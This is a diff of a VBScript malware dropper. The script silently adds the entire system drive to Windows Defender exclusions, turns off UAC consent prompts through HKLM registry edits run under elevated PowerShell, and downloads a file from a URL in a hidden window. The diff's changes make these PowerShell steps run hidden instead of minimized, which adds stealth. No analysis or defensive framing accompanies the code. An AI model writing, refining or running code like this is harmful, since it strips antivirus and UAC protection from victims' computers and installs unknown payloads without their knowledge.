@@ -32,12 +32,12 @@ runTask = "OneTimeRunfile"
 
 ' First: Add exclusion silently
 excludeCmd1 = "$env:SystemDrive | ForEach-Object { Add-MpPreference -ExclusionPath $_ } >$null 2>&1"
-excludeRun1 = "powershell.exe -windowstyle minimized -ExecutionPolicy Bypass -Command """ & excludeCmd1 & """"
+excludeRun1 = "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -Command """ & excludeCmd1 & """"
 shell.Run excludeRun1, 0, True
 
 ' Second: Modify UAC-related registry keys with elevation
 excludeCmd2 = "Start-Process powershell -Verb runAs -ArgumentList '-Command ""Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0; Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0; Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 1""'"
-excludeRun2 = "powershell.exe -windowstyle minimized -ExecutionPolicy Bypass -Command """ & excludeCmd2 & """"
+excludeRun2 = "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -Command """ & excludeCmd2 & """"
 shell.Run excludeRun2, 0, True
 
 downloadCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & target & "'"""
@@ -67,5 +67,6 @@ Function GetCountry(json)
         GetCountry = ""
     End If
 End Function
+
 
 
